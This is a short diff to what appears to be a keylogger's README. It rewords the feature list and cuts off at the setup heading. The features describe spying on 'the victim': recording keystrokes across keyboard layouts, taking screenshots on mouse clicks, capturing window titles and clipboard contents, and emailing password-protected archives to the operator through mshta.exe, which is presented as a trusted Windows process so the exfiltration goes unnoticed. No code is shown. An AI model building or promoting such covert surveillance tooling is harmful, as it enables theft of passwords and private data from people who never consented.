@@ -11,15 +11,16 @@
 	
 	[FEATURES]
 	
-	{*} Compresses everything in a zip archive (you can also set a password) and send the archive to you by e-mail using a trusted Windows process (mshta.exe)
-	{*} Screenshot of the screen when the left mouse button is pressed (you can set the dimension and how often the program can take a ss)
+	{*} Compresses everything in a zip archive (you can also set a password)
+	{*} The archive will be sent to you by e-mail using a trusted Windows process (mshta.exe)
+	{*} Screenshot of the screen when the left mouse button is pressed (you can set the dimensions and how often the program can take a ss)
 	{*} Dead keys support (Will not work with IME)
 	{*} Unicode characters support
 	e.g: if the victim uses a US keyboard layout and press SHIFT+2, the keylogger will read the correct
 		 character (@).
 		 if the victim uses a IT keyboard layout, the keylogger will catch (")
-	{*} Writes to the log also the focused window title
-	{*} Reads the clipboard when CTRL+C and CTRL+V are pressed (No "Copy" mouse support)
+	{*} Captures the title of the focused window 
+	{*} Reads the clipboard when CTRL+C or CTRL+V are pressed (No "Copy" mouse support)
 	
 	[HOW TO SETUP]
 	
